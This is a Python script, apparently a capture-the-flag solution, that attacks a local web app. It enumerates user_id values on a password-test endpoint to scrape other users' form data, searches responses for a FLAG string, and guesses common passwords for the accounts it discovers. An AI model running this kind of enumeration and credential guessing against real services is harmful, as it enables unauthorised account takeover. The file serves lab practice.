import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

print("[*] Testing GET /password/test with user_id parameter\n")

# Try accessing /password/test with different user_id query parameters
test_user_ids = list(range(1, 50)) + list(range(9990, 10050)) + [0, 100, 1000, 99999]

print(f"[*] Testing {len(test_user_ids)} user_id values as query parameters\n")

interesting_responses = []

for i, user_id in enumerate(test_user_ids):
    if (i + 1) % 25 == 0:
        print(f"[PROGRESS] Tested {i+1}/{len(test_user_ids)} user_ids")
    
    try:
        # Try as query parameter
        resp = requests.get(f"{PASSWORD_TEST_URL}?user_id={user_id}", timeout=5)
        
        if resp.status_code == 200:
            # Extract the hidden user_id value from the form
            user_id_match = re.search(r'name="user_id" value="(\d+)"', resp.text)
            username_match = re.search(r'name="username" value="([^"]+)"', resp.text)
            welcome_match = re.search(r'Welcome, ([^!]+)!', resp.text)
            
            if user_id_match:
                form_user_id = user_id_match.group(1)
                form_username = username_match.group(1) if username_match else "N/A"
                welcome_name = welcome_match.group(1) if welcome_match else "N/A"
                
                # Check if form values changed
                if form_user_id != "10032" or form_username != "test" or welcome_name != "John":
                    print(f"\n[+] DIFFERENT RESPONSE for user_id={user_id}")
                    print(f"    Form user_id: {form_user_id}")
                    print(f"    Form username: {form_username}")
                    print(f"    Welcome name: {welcome_name}")
                    print(f"    Response length: {len(resp.text)}B")
                    
                    interesting_responses.append({
                        'query_user_id': user_id,
                        'form_user_id': form_user_id,
                        'form_username': form_username,
                        'welcome_name': welcome_name,
                        'response': resp.text
                    })
            
            # Always check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                flag_value = flag_match.group(0)
                print(f"\n{'='*60}")
                print(f"[!] FLAG FOUND at user_id={user_id}")
                print(f"[!] FLAG: {flag_value}")
                print(f"{'='*60}")
                print(f"\n[+] Full Response:")
                print(resp.text)
                print(f"\n{'='*60}\n")
                break
    
    except Exception as e:
        pass

print(f"\n[SUMMARY]")
print(f"Total tested: {len(test_user_ids)}")
print(f"Interesting responses: {len(interesting_responses)}")

if interesting_responses:
    print(f"\n[+] User accounts found:")
    for resp_info in interesting_responses:
        print(f"    user_id={resp_info['form_user_id']}: username={resp_info['form_username']}, name={resp_info['welcome_name']}")
        
        # Try to authenticate as these users if we found different ones
        if resp_info['form_user_id'] != "10032":
            print(f"\n    [*] Attempting to authenticate as user_id={resp_info['form_user_id']}")
            
            # Try common passwords
            passwords = ['test', 'password', 'admin', '123456', resp_info['form_username']]
            
            for pwd in passwords:
                auth_data = {
                    'username': resp_info['form_username'],
                    'password': pwd,
                    'user_id': resp_info['form_user_id']
                }
                
                session = requests.Session()
                auth_resp = session.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=True, timeout=5)
                
                if '/dashboard' in auth_resp.url or (auth_resp.status_code == 200 and len(auth_resp.text) != 1184):
                    print(f"      [+] SUCCESS with password='{pwd}'")
                    print(f"      Response length: {len(auth_resp.text)}B")
                    
                    # Check for FLAG
                    flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
                    if flag_match:
                        print(f"\n      [!] FLAG: {flag_match.group(0)}")
                        print(f"\n      Full response:\n{auth_resp.text}")
                    break

